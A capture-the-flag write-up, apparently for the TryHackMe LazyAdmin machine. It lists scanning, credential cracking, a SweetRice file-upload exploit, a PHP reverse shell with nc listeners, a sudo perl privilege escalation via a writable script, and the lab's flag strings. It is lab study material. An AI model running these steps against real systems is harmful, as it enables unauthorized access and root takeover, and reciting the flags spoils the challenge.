# LazyAdmin

> Easy linux machine to practice your skills

<br>

Process:
- 1) scanning 
  - port scan: `nmap -T4 <ip>`
  - aggressive scan: `nmap -T4 -A -p 22,80 <ip>`
- 2) enumerate port 80:
  - run gobuster -> found: "/content"
  - found SweetRice CMS running (1.5.0)
- 3) search for exploit
  - `searchsploit sweetrice`
  - found arbitary file upload:
    - `searchsploit -m php/webapps/40716.py`
  - need username and password 
  - gobuster "http://<ip>/content":
    - found "/inc" folder -> found mysql sql backup file 
      - found username:password = manager:<hash>
      - crack MD5 hash = manager:Password123
    - login to cms console ("http://<ip>/content/as/")
- 4) exploit:
  - create a php reverse shell 
  - use exploit to upload shell:
    - `python3 40716.py` -> "<ip>/content" -> "manager" -> "Password123" -> "shell.php
  - setup nc listener: `nc -lvnp 1234`
  - execute shell: "<ip>/content/attachment/shell.php" -- get reverse shell
    - didn't work shell not there, try different filename ("shell.php5") --- worked 
- 5) find user flag:
  - `cat /home/itguy/user.txt` -> user flag = **THM{63e5bce9271952aad1113b6f1ac28a07}**
- 6) find root flag:
  - upgrade privileges:
    - find sudo permissions: `sudo -l`
    - have /usr/bin/perl, search GTFOBins
    - get root shell with: `sudo /usr/bin/perl -e 'exec "/bin/sh";'`
    - doesn't work need sudo password 
    - other file found is "/home/itguy/backup.pl" which runs "/etc/copy.sh" which you have permission to write 
    - change this file to a php reverse shell (uploaded same as before, but connecting to different port):
      - `cp /var/www/html/content/attachment/shell2.php5 /etc/copy.sh`
    - setup nc listener on other port: `nc -lvnp 4444`
    - execute sudo commands together:
      - `sudo /usr/bin/perl /etc/copy.sh`
    - catch root reverse shell and find root flag:
      - `cat /root/root.txt` -> root flag = **THM{6637f41d0177b6f37cb20d775124699f}**
